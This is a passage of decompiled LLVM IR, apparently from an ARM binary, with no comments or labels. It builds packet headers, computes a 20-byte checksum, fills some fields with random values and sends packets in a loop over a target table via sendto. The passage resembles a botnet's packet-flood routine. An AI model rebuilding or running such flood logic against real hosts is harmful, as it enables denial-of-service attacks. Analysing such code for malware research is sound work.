  %v4_c164 = load i32, i32* %v3_c164, align 4
  store i32 %v4_c164, i32* %r3.global-to-local, align 4
  %v2_c16c = load i32, i32* %r5.global-to-local, align 4
  %v3_c16c = add i32 %v2_c16c, 16
  %v4_c16c = inttoptr i32 %v3_c16c to i32*
  store i32 %v4_c164, i32* %v4_c16c, align 4
  br label %bb97

bb97:                                             ; preds = %.thread25, %.thread26
  store i32 %v4_bfec, i32* %r3.global-to-local, align 4
  %v0_c174 = load i32, i32* %r4.global-to-local, align 4
  %v1_c174 = add i32 %v0_c174, 44
  store i32 %v1_c174, i32* %r6.global-to-local, align 4
  %v1_c178 = load i32, i32* %r5.global-to-local, align 4
  %v2_c178 = add i32 %v1_c178, 12
  %v3_c178 = inttoptr i32 %v2_c178 to i32*
  store i32 %v0_c150, i32* %v3_c178, align 4
  store i32 %v4_c17c, i32* %r2.global-to-local, align 4
  %v0_c180 = load i32, i32* %r3.global-to-local, align 4
  %v1_c180 = trunc i32 %v0_c180 to i8
  %v2_c180 = load i32, i32* %r6.global-to-local, align 4
  %v3_c180 = inttoptr i32 %v2_c180 to i8*
  store i8 %v1_c180, i8* %v3_c180, align 1
  %v3_c184 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_c184, i32* %r3.global-to-local, align 4
  %v0_c188 = load i32, i32* %r2.global-to-local, align 4
  %v1_c188 = trunc i32 %v0_c188 to i8
  %v2_c188 = load i32, i32* %r6.global-to-local, align 4
  %v3_c188 = add i32 %v2_c188, 5
  %v4_c188 = inttoptr i32 %v3_c188 to i8*
  store i8 %v1_c188, i8* %v4_c188, align 1
  %v0_c18c = load i32, i32* %r3.global-to-local, align 4
  %v1_c18c = add i32 %v0_c18c, 1
  store i32 %v1_c18c, i32* %r4.global-to-local, align 4
  store i32 %v3_c004, i32* %r1.global-to-local, align 4
  store i32 %v7_c194, i32* %r2.global-to-local, align 4
  %v1_c198 = load i32, i32* @fp, align 4
  %v9_c198 = icmp eq i32 %v1_c18c, %v1_c198
  store i1 %v9_c198, i1* %cpsr_z.global-to-local, align 1
  %v2_c19c = load i32, i32* %r6.global-to-local, align 4
  %v3_c19c = add i32 %v2_c19c, 1
  %v4_c19c = inttoptr i32 %v3_c19c to i8*
  store i8 %v5_c014, i8* %v4_c19c, align 1
  %v0_c1a0 = load i32, i32* %r7.global-to-local, align 4
  %v1_c1a0 = trunc i32 %v0_c1a0 to i8
  %v2_c1a0 = load i32, i32* %r6.global-to-local, align 4
  %v3_c1a0 = add i32 %v2_c1a0, 2
  %v4_c1a0 = inttoptr i32 %v3_c1a0 to i8*
  store i8 %v1_c1a0, i8* %v4_c1a0, align 1
  %v0_c1a4 = load i32, i32* %r2.global-to-local, align 4
  %v1_c1a4 = trunc i32 %v0_c1a4 to i8
  %v2_c1a4 = load i32, i32* %r6.global-to-local, align 4
  %v3_c1a4 = add i32 %v2_c1a4, 3
  %v4_c1a4 = inttoptr i32 %v3_c1a4 to i8*
  store i8 %v1_c1a4, i8* %v4_c1a4, align 1
  %v0_c1a8 = load i32, i32* %r8.global-to-local, align 4
  %v1_c1a8 = trunc i32 %v0_c1a8 to i8
  %v2_c1a8 = load i32, i32* %r6.global-to-local, align 4
  %v3_c1a8 = add i32 %v2_c1a8, 4
  %v4_c1a8 = inttoptr i32 %v3_c1a8 to i8*
  store i8 %v1_c1a8, i8* %v4_c1a8, align 1
  %v0_c1ac = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_c1ac, i32* %stack_var_-40, align 4
  %v5_c1b0 = icmp slt i32 %v1_c18c, %v1_c198
  br i1 %v5_c1b0, label %dec_label_pc_c024, label %dec_label_pc_c1b4

dec_label_pc_c1b4:                                ; preds = %bb97
  %v1_c1bc = add i32 %v5_be50, 8
  store i32 %v1_c1bc, i32* %r3.global-to-local, align 4
  %v1_c1c0 = add i32 %v5_be50, 52
  store i32 %v1_c1c0, i32* %r1.global-to-local, align 4
  %v0_c1cc.pre.pre = load i32, i32* @fp, align 4
  br label %dec_label_pc_c1cc.preheader

dec_label_pc_c1cc.preheader:                      ; preds = %dec_label_pc_c1b4, %dec_label_pc_c460
  %v0_c1cc.pre = phi i32 [ %v0_c1cc.pre.pre, %dec_label_pc_c1b4 ], [ %v0_bf14, %dec_label_pc_c460 ]
  %stack_var_-120.0.ph = phi i32 [ %v1_c1c0, %dec_label_pc_c1b4 ], [ %v1_c46c, %dec_label_pc_c460 ]
  %stack_var_-152.0.ph = phi i32 [ %v1_c1bc, %dec_label_pc_c1b4 ], [ %v1_c468, %dec_label_pc_c460 ]
  %v2_c444 = icmp eq i32 %v1_be70, 0
  %v2_c244 = icmp eq i32 %v1_bf04, 0
  %v2_c210 = icmp eq i32 %v5_bea4, -1
  %v7_c210 = icmp eq i32 %v5_bea4, -1
  br label %dec_label_pc_c1cc

dec_label_pc_c1cc:                                ; preds = %dec_label_pc_c260, %dec_label_pc_c1cc.preheader
  %v0_c1cc = phi i32 [ %v0_c1cc.pre, %dec_label_pc_c1cc.preheader ], [ %v1_c324, %dec_label_pc_c260 ]
  %v2_c1cc = icmp eq i32 %v0_c1cc, 0
  store i1 %v2_c1cc, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r3.global-to-local, align 4
  %tmp98 = icmp slt i32 %v0_c1cc, 1
  br label %dec_label_pc_c1d4

dec_label_pc_c1d4:                                ; preds = %dec_label_pc_c1d4, %dec_label_pc_c1cc
  br i1 %tmp98, label %dec_label_pc_c1d4, label %dec_label_pc_c1d8

dec_label_pc_c1d8:                                ; preds = %dec_label_pc_c1d4
  store i32 0, i32* %stack_var_-40, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r8, align 4
  br label %dec_label_pc_c1e4

dec_label_pc_c1e4:                                ; preds = %dec_label_pc_c260, %dec_label_pc_c1d8
  %v1_c1f8 = phi i32 [ %v1_c320, %dec_label_pc_c260 ], [ 0, %dec_label_pc_c1d8 ]
  %v5_c1e8 = mul i32 %v1_c1f8, 24
  %v1_c1ec = load i32, i32* @sb, align 4
  %v2_c1ec = add i32 %v1_c1ec, %v5_c1e8
  store i32 %v2_c1ec, i32* %r3.global-to-local, align 4
  store i32 %v4_bd84, i32* %r1.global-to-local, align 4
  %v1_c1f4 = add i32 %v2_c1ec, 20
  %v2_c1f4 = inttoptr i32 %v1_c1f4 to i8*
  %v3_c1f4 = load i8, i8* %v2_c1f4, align 1
  %v4_c1f4 = zext i8 %v3_c1f4 to i32
  store i32 %v4_c1f4, i32* %r2.global-to-local, align 4
  %v4_c1f8 = mul i32 %v1_c1f8, 4
  %v5_c1f8 = add i32 %v4_c1f8, %v4_bd84
  %v6_c1f8 = inttoptr i32 %v5_c1f8 to i32*
  %v7_c1f8 = load i32, i32* %v6_c1f8, align 4
  store i32 %v7_c1f8, i32* @r5, align 4
  %v7_c1fc = icmp eq i8 %v3_c1f4, 31
  store i1 %v7_c1fc, i1* %cpsr_z.global-to-local, align 1
  %v1_c200 = add i32 %v7_c1f8, 24
  store i32 %v1_c200, i32* @r6, align 4
  %v1_c204 = add i32 %v7_c1f8, 44
  store i32 %v1_c204, i32* @r7, align 4
  %tmp106 = icmp ult i8 %v3_c1f4, 32
  br i1 %tmp106, label %dec_label_pc_c344, label %dec_label_pc_c20c

dec_label_pc_c20c:                                ; preds = %dec_label_pc_c1e4
  store i32 %v5_bea4, i32* %r2.global-to-local, align 4
  store i1 %v7_c210, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_c210, label %dec_label_pc_c3ac, label %dec_label_pc_c218

dec_label_pc_c218:                                ; preds = %dec_label_pc_c344, %dec_label_pc_c20c
  store i32 65535, i32* @r4, align 4
  %v0_c220 = load i32, i32* @sl, align 4
  %v9_c220 = icmp eq i32 %v0_c220, 65535
  store i1 %v9_c220, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c220, label %dec_label_pc_c3c4, label %dec_label_pc_c228

dec_label_pc_c228:                                ; preds = %dec_label_pc_c3ac.dec_label_pc_c228_crit_edge, %dec_label_pc_c218
  %v1_c22c = phi i32 [ %v1_c22c.pre, %dec_label_pc_c3ac.dec_label_pc_c228_crit_edge ], [ 65535, %dec_label_pc_c218 ]
  store i32 %v3_bf0c, i32* %r3.global-to-local, align 4
  %v9_c22c = icmp eq i32 %v3_bf0c, %v1_c22c
  store i1 %v9_c22c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c22c, label %dec_label_pc_c3fc, label %dec_label_pc_c234

dec_label_pc_c234:                                ; preds = %dec_label_pc_c3c4.dec_label_pc_c234_crit_edge, %dec_label_pc_c228
  %v1_c238 = phi i32 [ %v1_c238.pre, %dec_label_pc_c3c4.dec_label_pc_c234_crit_edge ], [ %v1_c22c, %dec_label_pc_c228 ]
  store i32 %v3_bf10, i32* %r1.global-to-local, align 4
  %v9_c238 = icmp eq i32 %v3_bf10, %v1_c238
  store i1 %v9_c238, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c238, label %dec_label_pc_c418, label %dec_label_pc_c240

dec_label_pc_c240:                                ; preds = %dec_label_pc_c3fc, %dec_label_pc_c234
  store i32 %v1_bf04, i32* %r2.global-to-local, align 4
  store i1 %v2_c244, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_c244, label %dec_label_pc_c43c, label %.thread27

.thread27:                                        ; preds = %dec_label_pc_c240
  %v1_c248 = load i32, i32* @r5, align 4
  %v2_c248 = add i32 %v1_c248, 16
  %v3_c248 = inttoptr i32 %v2_c248 to i32*
  %v4_c248 = load i32, i32* %v3_c248, align 4
  store i32 %v4_c248, i32* %r3.global-to-local, align 4
  %v2_c24c = load i32, i32* @r6, align 4
  %v3_c24c = add i32 %v2_c24c, 16
  %v4_c24c = inttoptr i32 %v3_c24c to i32*
  store i32 %v4_c248, i32* %v4_c24c, align 4
  br label %dec_label_pc_c254

dec_label_pc_c254:                                ; preds = %bb103, %.thread27
  store i32 %v1_be70, i32* %r3.global-to-local, align 4
  store i1 %v2_c444, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_c444, label %dec_label_pc_c260, label %dec_label_pc_c450

dec_label_pc_c260:                                ; preds = %dec_label_pc_c254, %dec_label_pc_c43c, %dec_label_pc_c450
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_c264 = load i32, i32* @r8, align 4
  %v1_c264 = trunc i32 %v0_c264 to i8
  %v2_c264 = load i32, i32* @r5, align 4
  %v3_c264 = add i32 %v2_c264, 10
  %v4_c264 = inttoptr i32 %v3_c264 to i8*
  store i8 %v1_c264, i8* %v4_c264, align 1
  %v0_c268 = load i32, i32* @r8, align 4
  %v1_c268 = trunc i32 %v0_c268 to i8
  %v2_c268 = load i32, i32* @r5, align 4
  %v3_c268 = add i32 %v2_c268, 11
  %v4_c268 = inttoptr i32 %v3_c268 to i8*
  store i8 %v1_c268, i8* %v4_c268, align 1
  %v0_c26c = load i32, i32* @r5, align 4
  store i32 %v0_c26c, i32* @r0, align 4
  %v2_c270 = call i32 @function_f17c(i32 %v0_c26c, i32 20)
  %v3_c270 = trunc i32 %v2_c270 to i8
  %v4_c274 = sdiv i32 %v2_c270, 256
  store i32 %v4_c274, i32* %r3.global-to-local, align 4
  %v1_c278 = trunc i32 %v4_c274 to i8
  %v2_c278 = load i32, i32* @r5, align 4
  %v3_c278 = add i32 %v2_c278, 11
  %v4_c278 = inttoptr i32 %v3_c278 to i8*
  store i8 %v1_c278, i8* %v4_c278, align 1
  %v3_c27c = load i32, i32* @r5, align 4
  %v4_c27c = add i32 %v3_c27c, 10
  %v5_c27c = inttoptr i32 %v4_c27c to i8*
  store i8 %v3_c270, i8* %v5_c27c, align 1
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_c284 = load i32, i32* @r8, align 4
  %v1_c284 = trunc i32 %v0_c284 to i8
  %v2_c284 = load i32, i32* @r6, align 4
  %v3_c284 = add i32 %v2_c284, 10
  %v4_c284 = inttoptr i32 %v3_c284 to i8*
  store i8 %v1_c284, i8* %v4_c284, align 1
  %v0_c288 = load i32, i32* @r8, align 4
  %v1_c288 = trunc i32 %v0_c288 to i8
  %v2_c288 = load i32, i32* @r6, align 4
  %v3_c288 = add i32 %v2_c288, 11
  %v4_c288 = inttoptr i32 %v3_c288 to i8*
  store i8 %v1_c288, i8* %v4_c288, align 1
  %v0_c28c = load i32, i32* @r6, align 4
  store i32 %v0_c28c, i32* @r0, align 4
  %v2_c290 = call i32 @function_f17c(i32 %v0_c28c, i32 20)
  %v3_c290 = trunc i32 %v2_c290 to i8
  store i32 %v2_c290, i32* %r0.global-to-local, align 4
  %v4_c294 = sdiv i32 %v2_c290, 256
  store i32 %v4_c294, i32* %r3.global-to-local, align 4
  %v3_c298 = load i32, i32* @r6, align 4
  %v4_c298 = add i32 %v3_c298, 10
  %v5_c298 = inttoptr i32 %v4_c298 to i8*
  store i8 %v3_c290, i8* %v5_c298, align 1
  %v0_c29c = load i32, i32* %r3.global-to-local, align 4
  %v1_c29c = trunc i32 %v0_c29c to i8
  %v2_c29c = load i32, i32* @r6, align 4
  %v3_c29c = add i32 %v2_c29c, 11
  %v4_c29c = inttoptr i32 %v3_c29c to i8*
  store i8 %v1_c29c, i8* %v4_c29c, align 1
  %v0_c2a0 = load i32, i32* @r7, align 4
  %v1_c2a0 = add i32 %v0_c2a0, 4
  %v2_c2a0 = inttoptr i32 %v1_c2a0 to i8*
  %v3_c2a0 = load i8, i8* %v2_c2a0, align 1
  %v4_c2a0 = zext i8 %v3_c2a0 to i32
  store i32 %v4_c2a0, i32* %r3.global-to-local, align 4
  %v1_c2a4 = add i32 %v0_c2a0, 5
  %v2_c2a4 = inttoptr i32 %v1_c2a4 to i8*
  %v3_c2a4 = load i8, i8* %v2_c2a4, align 1
  %v4_c2a4 = zext i8 %v3_c2a4 to i32
  store i32 %v0_c2a0, i32* @r1, align 4
  %v4_c2ac = mul nuw nsw i32 %v4_c2a4, 256
  %v5_c2ac = or i32 %v4_c2ac, %v4_c2a0
  store i32 %v5_c2ac, i32* %r2.global-to-local, align 4
  %v0_c2b0 = load i32, i32* @r8, align 4
  %v1_c2b0 = trunc i32 %v0_c2b0 to i8
  %v3_c2b0 = add i32 %v0_c2a0, 6
  %v4_c2b0 = inttoptr i32 %v3_c2b0 to i8*
  store i8 %v1_c2b0, i8* %v4_c2b0, align 1
  store i32 %stack_var_-152.0.ph, i32* %r3.global-to-local, align 4
  %v0_c2b8 = load i32, i32* @r8, align 4
  %v1_c2b8 = trunc i32 %v0_c2b8 to i8
  %v2_c2b8 = load i32, i32* @r7, align 4
  %v3_c2b8 = add i32 %v2_c2b8, 7
  %v4_c2b8 = inttoptr i32 %v3_c2b8 to i8*
  store i8 %v1_c2b8, i8* %v4_c2b8, align 1
  %v0_c2bc = load i32, i32* @r6, align 4
  store i32 %v0_c2bc, i32* %r0.global-to-local, align 4
  %v4_c2c0 = call i32 @function_f1d8(i32 %v0_c2bc, i32 %v0_c2a0, i32 %v5_c2ac, i32 %stack_var_-152.0.ph)
  %v5_c2c0 = trunc i32 %v4_c2c0 to i8
  store i32 %v4_c2c0, i32* %r0.global-to-local, align 4
  %v3_c2c4 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_c2c4, i32* %r3.global-to-local, align 4
  %v3_c2c8 = mul i32 %v3_c2c4, 32
  store i32 %v3_c2c8, i32* %r2.global-to-local, align 4
  %v0_c2cc = load i32, i32* @r5, align 4
  %v1_c2cc = add i32 %v0_c2cc, 16
  %v2_c2cc = inttoptr i32 %v1_c2cc to i32*
  %v3_c2cc = load i32, i32* %v2_c2cc, align 4
  store i32 %v3_c2cc, i32* %r1.global-to-local, align 4
  %v5_c2d0 = mul i32 %v3_c2c4, 24
  store i32 %v5_c2d0, i32* %r2.global-to-local, align 4
  %v4_c2d443 = udiv i32 %v4_c2c0, 256
  %v1_c2d8 = trunc i32 %v4_c2d443 to i8
  %v2_c2d8 = load i32, i32* @r7, align 4
  %v3_c2d8 = add i32 %v2_c2d8, 7
  %v4_c2d8 = inttoptr i32 %v3_c2d8 to i8*
  store i8 %v1_c2d8, i8* %v4_c2d8, align 1
  %v0_c2dc = load i32, i32* %r2.global-to-local, align 4
  %v1_c2dc = load i32, i32* @sb, align 4
  %v2_c2dc = add i32 %v1_c2dc, %v0_c2dc
  store i32 %v2_c2dc, i32* %lr.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v3_c2e4 = load i32, i32* @r7, align 4
  %v4_c2e4 = add i32 %v3_c2e4, 6
  %v5_c2e4 = inttoptr i32 %v4_c2e4 to i8*
  store i8 %v5_c2c0, i8* %v5_c2e4, align 1
  %v0_c2e8 = load i32, i32* %r1.global-to-local, align 4
  %v1_c2e8 = load i32, i32* %lr.global-to-local, align 4
  %v2_c2e8 = add i32 %v1_c2e8, 4
  %v3_c2e8 = inttoptr i32 %v2_c2e8 to i32*
  store i32 %v0_c2e8, i32* %v3_c2e8, align 4
  %v0_c2ec = load i32, i32* %r3.global-to-local, align 4
  %v1_c2ec = trunc i32 %v0_c2ec to i8
  %v2_c2ec = load i32, i32* %r2.global-to-local, align 4
  %v3_c2ec = load i32, i32* @sb, align 4
  %v4_c2ec = add i32 %v3_c2ec, %v2_c2ec
  %v5_c2ec = inttoptr i32 %v4_c2ec to i8*
  store i8 %v1_c2ec, i8* %v5_c2ec, align 1
  %v0_c2f0 = load i32, i32* @r8, align 4
  %v1_c2f0 = trunc i32 %v0_c2f0 to i8
  %v2_c2f0 = load i32, i32* %lr.global-to-local, align 4
  %v3_c2f0 = add i32 %v2_c2f0, 2
  %v4_c2f0 = inttoptr i32 %v3_c2f0 to i8*
  store i8 %v1_c2f0, i8* %v4_c2f0, align 1
  %v0_c2f4 = load i32, i32* @r8, align 4
  %v1_c2f4 = trunc i32 %v0_c2f4 to i8
  %v2_c2f4 = load i32, i32* %lr.global-to-local, align 4
  %v3_c2f4 = add i32 %v2_c2f4, 1
  %v4_c2f4 = inttoptr i32 %v3_c2f4 to i8*
  store i8 %v1_c2f4, i8* %v4_c2f4, align 1
  %v0_c2f8 = load i32, i32* @r8, align 4
  %v1_c2f8 = trunc i32 %v0_c2f8 to i8
  %v2_c2f8 = load i32, i32* %lr.global-to-local, align 4
  %v3_c2f8 = add i32 %v2_c2f8, 3
  %v4_c2f8 = inttoptr i32 %v3_c2f8 to i8*
  store i8 %v1_c2f8, i8* %v4_c2f8, align 1
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_c304 = load i32, i32* @r5, align 4
  store i32 %v0_c304, i32* %r1.global-to-local, align 4
  store i32 %v3_beb8, i32* %r0.global-to-local, align 4
  store i32 %stack_var_-120.0.ph, i32* %r2.global-to-local, align 4
  %v0_c310 = load i32, i32* %lr.global-to-local, align 4
  %v4_c310 = inttoptr i32 %v0_c310 to %sockaddr*
  %v7_c318 = inttoptr i32 %v0_c304 to i32*
  %v9_c318 = call i32 @sendto(i32 %v3_beb8, i32* %v7_c318, i32 %stack_var_-120.0.ph, i32 16384, %sockaddr* %v4_c310, i32 16)
  %v3_c31c = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_c31c, i32* %r3.global-to-local, align 4
  %v1_c320 = add i32 %v3_c31c, 1
  store i32 %v1_c320, i32* %r0.global-to-local, align 4
  %v1_c324 = load i32, i32* @fp, align 4
  %v9_c324 = icmp eq i32 %v1_c320, %v1_c324
  store i1 %v9_c324, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_c320, i32* %stack_var_-40, align 4
  %v6_c32c = icmp slt i32 %v1_c320, %v1_c324
  br i1 %v6_c32c, label %dec_label_pc_c1e4, label %dec_label_pc_c1cc

dec_label_pc_c334:                                ; preds = %dec_label_pc_bec8
  store i32 %v3_beb8, i32* %r0.global-to-local, align 4
  %v1_c338 = call i32 @close(i32 %v3_beb8)
  store i32 %v1_c338, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_c33c

dec_label_pc_c33c:                                ; preds = %dec_label_pc_bd64, %dec_label_pc_c334
  %v29_c340 = phi i32 [ %v3_beb8, %dec_label_pc_bd64 ], [ %v1_c338, %dec_label_pc_c334 ]
  store i32 %v3_bd64, i32* %r4.global-to-local, align 4
  store i32 %v6_bd64, i32* %r5.global-to-local, align 4
  store i32 %v9_bd64, i32* %r6.global-to-local, align 4
  store i32 %v12_bd64, i32* %r7.global-to-local, align 4
  store i32 %v15_bd64, i32* %r8.global-to-local, align 4
  ret i32 %v29_c340

dec_label_pc_c344:                                ; preds = %dec_label_pc_c1e4
  %v1_c344 = add i32 %v2_c1ec, 16
  %v2_c344 = inttoptr i32 %v1_c344 to i32*
  %v3_c344 = load i32, i32* %v2_c344, align 4
  store i32 %v3_c344, i32* %r4.global-to-local, align 4
  %v0_c348 = call i32 @function_10b68()
  store i32 %v0_c348, i32* %r0.global-to-local, align 4
  %v3_c34c = load i32, i32* %stack_var_-40, align 4
  %v5_c354 = mul i32 %v3_c34c, 24
  %v0_c358 = load i32, i32* %r4.global-to-local, align 4
  %v1_c35c = load i32, i32* @sb, align 4
  %v2_c35c = add i32 %v1_c35c, %v5_c354
  store i32 %v2_c35c, i32* %r1.global-to-local, align 4
  %v1_c360 = and i32 %v0_c358, 65280
  store i32 %v1_c360, i32* %r3.global-to-local, align 4
  %v1_c358 = udiv i32 %v0_c358, 256
  %v3_c364 = and i32 %v1_c358, 65280
  store i32 %v3_c364, i32* %r2.global-to-local, align 4
  %v1_c36c = add i32 %v2_c35c, 20
  %v2_c36c = inttoptr i32 %v1_c36c to i8*
  %v3_c36c = load i8, i8* %v2_c36c, align 1
  %v4_c36c = zext i8 %v3_c36c to i32
  store i32 %v4_c36c, i32* %lr.global-to-local, align 4
  %v2_c378 = call i32 @llvm.bswap.i32(i32 %v0_c358)
  %v7_c37c = lshr i32 %v0_c348, %v4_c36c
  %v8_c37c = add i32 %v7_c37c, %v2_c378
  %v3_c388 = mul i32 %v8_c37c, 16777216
  %v1_c38c = and i32 %v8_c37c, 65280
  store i32 %v1_c38c, i32* %r0.global-to-local, align 4
  store i32 %v5_bea4, i32* %r2.global-to-local, align 4
  %v4_c398 = mul nuw nsw i32 %v1_c38c, 256
  %v5_c398 = or i32 %v4_c398, %v3_c388
  store i32 %v5_c398, i32* %r1.global-to-local, align 4
  %v2_c39c = call i32 @llvm.bswap.i32(i32 %v8_c37c)
  store i32 %v2_c39c, i32* %r3.global-to-local, align 4
  store i1 %v7_c210, i1* %cpsr_z.global-to-local, align 1
  %v1_c3a4 = load i32, i32* @r5, align 4
  %v2_c3a4 = add i32 %v1_c3a4, 16
  %v3_c3a4 = inttoptr i32 %v2_c3a4 to i32*
  store i32 %v2_c39c, i32* %v3_c3a4, align 4
  br i1 %v2_c210, label %dec_label_pc_c3ac, label %dec_label_pc_c218

dec_label_pc_c3ac:                                ; preds = %dec_label_pc_c344, %dec_label_pc_c20c
  %v0_c3ac = call i32 @function_10b68()
  store i32 %v0_c3ac, i32* %r0.global-to-local, align 4
  store i32 65535, i32* @r4, align 4
  %v0_c3b8 = load i32, i32* @sl, align 4
  %v9_c3b8 = icmp eq i32 %v0_c3b8, 65535
  store i1 %v9_c3b8, i1* %cpsr_z.global-to-local, align 1
  %v1_c3bc = load i32, i32* @r5, align 4
  %v2_c3bc = add i32 %v1_c3bc, 12
  %v3_c3bc = inttoptr i32 %v2_c3bc to i32*
  store i32 %v0_c3ac, i32* %v3_c3bc, align 4
  br i1 %v9_c3b8, label %dec_label_pc_c3c4, label %dec_label_pc_c3ac.dec_label_pc_c228_crit_edge

dec_label_pc_c3ac.dec_label_pc_c228_crit_edge:    ; preds = %dec_label_pc_c3ac
  %v1_c22c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_c228

dec_label_pc_c3c4:                                ; preds = %dec_label_pc_c3ac, %dec_label_pc_c218
  %v0_c3c4 = call i32 @function_10b68()
  %v3_c3cc = urem i32 %v0_c3c4, 65536
  store i32 %v3_c3cc, i32* %r0.global-to-local, align 4
  %v3_c3d016 = udiv i32 %v0_c3c4, 256
  %v1_c3d4 = trunc i32 %v3_c3d016 to i8
  %v2_c3d4 = load i32, i32* @r5, align 4
  %v3_c3d4 = add i32 %v2_c3d4, 5
  %v4_c3d4 = inttoptr i32 %v3_c3d4 to i8*
  store i8 %v1_c3d4, i8* %v4_c3d4, align 1
  %v0_c3d8 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v3_bf0c, i32* %r3.global-to-local, align 4
  %v1_c3e0 = sub i32 999, %v0_c3d8
  store i32 %v1_c3e0, i32* %r2.global-to-local, align 4
  %v3_c3e4 = sdiv i32 %v1_c3e0, 256
  store i32 %v3_c3e4, i32* %r1.global-to-local, align 4
  %v1_c3e8 = load i32, i32* @r4, align 4
  %v9_c3e8 = icmp eq i32 %v3_bf0c, %v1_c3e8
  store i1 %v9_c3e8, i1* %cpsr_z.global-to-local, align 1
  %v1_c3ec = trunc i32 %v0_c3d8 to i8
  %v2_c3ec = load i32, i32* @r5, align 4
  %v3_c3ec = add i32 %v2_c3ec, 4
  %v4_c3ec = inttoptr i32 %v3_c3ec to i8*
  store i8 %v1_c3ec, i8* %v4_c3ec, align 1
  %v0_c3f0 = load i32, i32* %r1.global-to-local, align 4
  %v1_c3f0 = trunc i32 %v0_c3f0 to i8
  %v2_c3f0 = load i32, i32* @r6, align 4
  %v3_c3f0 = add i32 %v2_c3f0, 5
  %v4_c3f0 = inttoptr i32 %v3_c3f0 to i8*
  store i8 %v1_c3f0, i8* %v4_c3f0, align 1
  %v0_c3f4 = load i32, i32* %r2.global-to-local, align 4
  %v1_c3f4 = trunc i32 %v0_c3f4 to i8
  %v2_c3f4 = load i32, i32* @r6, align 4
  %v3_c3f4 = add i32 %v2_c3f4, 4
  %v4_c3f4 = inttoptr i32 %v3_c3f4 to i8*
  store i8 %v1_c3f4, i8* %v4_c3f4, align 1
  %v0_c3f8 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_c3f8, label %dec_label_pc_c3fc, label %dec_label_pc_c3c4.dec_label_pc_c234_crit_edge

dec_label_pc_c3c4.dec_label_pc_c234_crit_edge:    ; preds = %dec_label_pc_c3c4
  %v1_c238.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_c234

dec_label_pc_c3fc:                                ; preds = %dec_label_pc_c3c4, %dec_label_pc_c228
  %v0_c3fc = call i32 @function_10b68()
  %v1_c3fc = trunc i32 %v0_c3fc to i8
  store i32 %v0_c3fc, i32* %r0.global-to-local, align 4
  store i32 %v3_bf10, i32* %r1.global-to-local, align 4
  %v4_c404 = sdiv i32 %v0_c3fc, 256
  store i32 %v4_c404, i32* %r3.global-to-local, align 4
  %v1_c408 = load i32, i32* @r4, align 4
  %v9_c408 = icmp eq i32 %v3_bf10, %v1_c408
  store i1 %v9_c408, i1* %cpsr_z.global-to-local, align 1
  %v3_c40c = load i32, i32* @r5, align 4
  %v4_c40c = add i32 %v3_c40c, 44
  %v5_c40c = inttoptr i32 %v4_c40c to i8*
  store i8 %v1_c3fc, i8* %v5_c40c, align 1
  %v0_c410 = load i32, i32* %r3.global-to-local, align 4
  %v1_c410 = trunc i32 %v0_c410 to i8
  %v2_c410 = load i32, i32* @r7, align 4
  %v3_c410 = add i32 %v2_c410, 1
  %v4_c410 = inttoptr i32 %v3_c410 to i8*
  store i8 %v1_c410, i8* %v4_c410, align 1
  %v0_c414 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_c414, label %dec_label_pc_c418, label %dec_label_pc_c240

dec_label_pc_c418:                                ; preds = %dec_label_pc_c3fc, %dec_label_pc_c234
  %v0_c418 = call i32 @function_10b68()
  %v1_c418 = trunc i32 %v0_c418 to i8
  store i32 %v0_c418, i32* %r0.global-to-local, align 4
  store i32 %v1_bf04, i32* %r2.global-to-local, align 4
  %v4_c420 = sdiv i32 %v0_c418, 256
  store i32 %v4_c420, i32* %r3.global-to-local, align 4
  store i1 %v2_c244, i1* %cpsr_z.global-to-local, align 1
  %v1_c428 = trunc i32 %v4_c420 to i8
  %v2_c428 = load i32, i32* @r7, align 4
  %v3_c428 = add i32 %v2_c428, 3
  %v4_c428 = inttoptr i32 %v3_c428 to i8*
  store i8 %v1_c428, i8* %v4_c428, align 1
  %v0_c42c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_c42c, label %bb102, label %bb101

bb101:                                            ; preds = %dec_label_pc_c418
  %v1_c42c = load i32, i32* @r5, align 4
  %v2_c42c = add i32 %v1_c42c, 16
  %v3_c42c = inttoptr i32 %v2_c42c to i32*
  %v4_c42c = load i32, i32* %v3_c42c, align 4
  store i32 %v4_c42c, i32* %r3.global-to-local, align 4
  br label %bb102

bb102:                                            ; preds = %dec_label_pc_c418, %bb101
  %v3_c430 = load i32, i32* @r7, align 4
  %v4_c430 = add i32 %v3_c430, 2
  %v5_c430 = inttoptr i32 %v4_c430 to i8*
  store i8 %v1_c418, i8* %v5_c430, align 1
  %v0_c434 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_c434, label %dec_label_pc_c43c, label %bb103

bb103:                                            ; preds = %bb102
  %v1_c434 = load i32, i32* %r3.global-to-local, align 4
  %v2_c434 = load i32, i32* @r6, align 4
  %v3_c434 = add i32 %v2_c434, 16
  %v4_c434 = inttoptr i32 %v3_c434 to i32*
  store i32 %v1_c434, i32* %v4_c434, align 4
  br label %dec_label_pc_c254

dec_label_pc_c43c:                                ; preds = %dec_label_pc_c240, %bb102
  %v0_c43c = call i32 @function_10b68()
  store i32 %v0_c43c, i32* %r0.global-to-local, align 4
  store i32 %v1_be70, i32* %r3.global-to-local, align 4
  store i1 %v2_c444, i1* %cpsr_z.global-to-local, align 1
  %v1_c448 = load i32, i32* @r6, align 4
